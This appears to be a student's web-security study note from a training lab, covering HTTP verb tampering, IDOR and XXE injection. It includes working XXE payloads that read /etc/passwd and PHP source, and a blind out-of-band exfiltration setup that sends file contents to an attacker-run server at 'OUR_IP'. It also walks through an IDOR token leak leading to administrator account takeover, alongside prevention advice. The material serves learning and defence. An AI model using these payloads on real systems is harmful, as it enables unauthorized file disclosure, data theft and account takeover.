#CWES #XXE #IDOR #verbtampering

#### Lessons:
- It matters if scripts are run with sh or bash! You wan to use bash when you can, so add the `#!/usr/bin/env bash` shabang at the top of the script. 
- Lookup blind XXE, this is a bit wierd. 

#### HTTP verb tampering 
- Exploits web servers that accept many http verbs and methods.
- Ideally the web server and the app should only accept a given set of http methods, not all of them
![[Pasted image 20260615050030.png]]

- It can be useful to check what HTTP methods the webserver accepts: 
```shell
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

If that do not work, you can also do:
```shell
for method in GET POST PUT PATCH DELETE OPTIONS TRACE HEAD; do
  echo "=== $method ==="
  curl -s -o /dev/null -w "%{http_code}\n" -X "$method" http://154.57.164.82:30953/
done
```

- It is more common that the error is in the web application code, rather then the web server config. 

#### IDOR:
- Insecure direct object references 
- Getting access to resources that we should not get access to 
- "IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects"
- Main reason for such vulnerabilities is lack of control system 

**How to find IDOR:**
- First we need to identify Direct object references in the application: URL parameters, APIs with object reference, HTTP headers such as cookies.
- Then, try to change these values, increment if they are numbers, or fuzz them. 
- Objects can also be hashed, which can make it harder to work with (given they use a good hashing algo)

**IDOR for information disclosure:**
- IDOR can also be used to disclose information, which can be used to attack other vulnerabilities later 
- Example, get API which lets us leak information about other users. This leaked data could be used to attack other parts of the application.

**Prevent IDOR:**
- The core cause of IDOR is usually broken access control, so a good RBAC to a all objects and resources is a good measure against IDOR.
- Never have objects in clear text / simple patterns, they should be unique ex. salted hashes or UUIDs.


#### XXE
More doc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md 


**Methodology**:
1. Check for internal entity inclusion, have a POC to verify that there exist a vulnerability
2. Check for external entity inclusion, via referencing a file. Try php base64 encode if it does not work.
3. Try to redirect output via blind extraction.

- XML external entity injection
- Exploits the way the web app parses the XML data 
- When looking for which element of a XML input to inject our payload, look for elements that gets displayed in the response. 
- Some pages looks like they only respond to JSON data, but they might not have disabled XML. We can try to change the Content-Type to application/xml and convert the json data to xml with such tool: https://www.convertjson.com/json-to-xml.htm 
- XML has a strict syntax on which characters to use, example space, |, <> {} may break it, so consider finding workaround for these characters. 
- XML can also be used to leak source code, but sometimes we need to encode the file to be able to read it, ex: 
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

**Note:** XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

- XXE can be used to gain RCE, the easiest way is to look for ssh key on the server and try leaking them.  We can also use the expect module if it is installed. 


**Basic xxe poc, trying to read file:**
```
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`
```


**Basic xml terminology:**
![[Pasted image 20260707084903.png]]
- DTD: Document type definition, allowes the validation of XML doc against pre-defined document structure. This is usually placed right after the xml declaration in the first line, ex:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```
- We can also reference a DTD via a url:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```
- To reference external xml entities, we use the SYSTEM (Can also use PUBLIC)keyword which is followed by the external entity path
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

**POC to check for xml internal entity injection:**
```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE root [  
<!ENTITY flag "hi">  
]>  
<root>  
<name>&flag;</name>  
<details>test1</details>  
<date>2026-07-22</date>  
</root>
```
- We try to define a string via dtd, and see if we can print it via 1 of the variables, this should print hi in the name element.
- Once we have confirmed this, we can try **external entity injection:**
```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE root [  
<!ENTITY flag SYSTEM "file:///etc/hostname">  
]>  
<root>  
<name>&flag;</name>  
<details>test1</details>  
<date>2026-07-22</date>  
</root>
```


**A more advanced way to leak files:**
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>

...

<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
- Here we join the begin, file and end entities on our IP which gets fetched by the app server: 
```shell
HaakonWiland@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
HaakonWiland@htb[/htb]$ python3 -m http.server 8000
```
- We must do this since xml does not allow joining of internal and external resources 

**Blind XXE for data exfiltration**
Since we do not get any output, the idea is to send the output to our server instead. Similar to blind xxs attacks. 

We need:
- The request we send to the target 
- A payload - we use a .dtd file 
- And a server - we use a basic php server 

Request we send to the target:
```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Payload: xxe.dtd
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

PHP server: index.php
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```


**XXE prevention:**
- XML input usually not handled manually by the web app, but rather by built-in XML libs. If these libs are up to date, it will mitigate the change of XXE
- https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php 
- Disable runtime error displaying in the web server

Configuring XML correctly will also help: 
- Disable referencing custom `Document Type Definitions (DTDs)`
- Disable referencing `External XML Entities`
- Disable `Parameter Entity` processing
- Disable support for `XInclude`
- Prevent `Entity Reference Loops`


Skill assessment:
- PHPSESSID does not look like a hash, is there a way to forge them? That might let us exploit idor or change passwords for different users.

```
GET /api.php/token/73 HTTP/1.1
Host: 154.57.164.79:30959
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.79:30959/settings.php
Connection: keep-alive
Priority: u=4
```
- The above gives us tokens for any users, notice we have removed the cookie header. 
- Once we get a token without a phpsession cookie, can be used to reset password? -> must be done with GET request, normal /reset.php is by default POST but it also accepts GET.
- We need to know the usernames of the uid we just changed -> /api.php/user/id -> only 100 users from 1 - 100. One of the users worked for the company "administrator"(id=52), we log into this one. 
Here we have a way to post xml data, there should be a way to do xxe. 